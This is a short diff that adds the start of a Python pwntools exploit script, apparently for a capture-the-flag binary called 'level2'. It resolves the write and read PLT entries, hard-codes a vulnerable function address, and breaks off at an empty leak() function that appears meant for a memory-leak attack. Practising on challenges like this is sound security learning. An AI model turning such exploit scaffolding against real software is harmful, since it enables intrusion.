@@ -1,0 +1,11 @@
+#!/usr/bin/env python
+
+from pwn import *
+
+elf = ELF('../bin/level2')
+plt_write = elf.symbols['write']
+plt_read = elf.symbols['read']
+vulfun_addr = 0x804844d
+
+def leak(address):
+
